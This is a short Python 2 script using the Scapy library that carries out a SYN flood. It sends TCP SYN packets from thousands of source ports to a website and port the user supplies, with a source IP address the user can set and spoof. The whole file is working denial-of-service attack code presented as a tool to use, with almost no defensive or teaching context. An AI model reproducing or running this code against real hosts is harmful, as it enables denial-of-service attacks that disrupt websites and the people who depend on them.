#!/usr/bin/env python2
# written by Moses Arocha
# Created in Python, it is a SYN Flood Attack that uses the library Scapy, created with the help of TJ O'Connor "Violent Python"

import socket
from scapy.all import *

def SynAttack(Source, Target, DestinationPort): 		# The function that creates and distributes the SYN attack
	for sport in range(1024, 65535):			# Continues to send packets as long as the range is between 1024, 65535 (64511)
		IPlayer = IP(src=Source, dst=Target)			 
		TCPlayer = TCP(sport=sport, dport=DestinationPort)	#The destination port of attack is defined by the user
		packet = IPlayer / TCPlayer
		send(packet)					#Sends the packet, continuously

Source = raw_input("\n\n\t What is the Source IP Address : ")	#Asks for the users input to determine packets sent
Target = raw_input("\n\n\t What is the Website Wished To Attack? http://") 
socket.gethostbyname(Target)					# Allows the intergretion of a DNS server, so users can insert websites
DestinationPort = int(raw_input("\n\n\t What Port Would You Like To Attack Through? : ")) # Allows users to insert exactly what port attacks

if not os.geteuid() == 0:
	sys.exit('Must Be Root!')
SynAttack(Source, Target, DestinationPort) # references and calls for the SynAttack function
